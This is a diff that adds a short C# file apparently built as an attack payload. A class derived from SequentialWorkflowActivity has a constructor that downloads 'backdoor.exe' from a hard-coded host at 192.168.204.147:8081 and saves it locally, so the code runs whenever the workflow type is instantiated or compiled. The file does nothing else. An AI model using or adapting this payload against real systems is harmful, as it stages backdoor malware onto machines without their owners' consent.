@@ -1,0 +1,23 @@
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Net;
+using System.Net.Sockets;
+using System.Workflow.Activities;
+
+public class Program : SequentialWorkflowActivity
+{
+	static StreamWriter streamWriter;
+
+	public Program()
+	{
+		Console.WriteLine("Test");
+
+		using (var client = new WebClient())
+		{
+			client.DownloadFile("http://192.168.204.147:8081/backdoor.exe", "backdoor.exe");
+		}	
+	}
+}
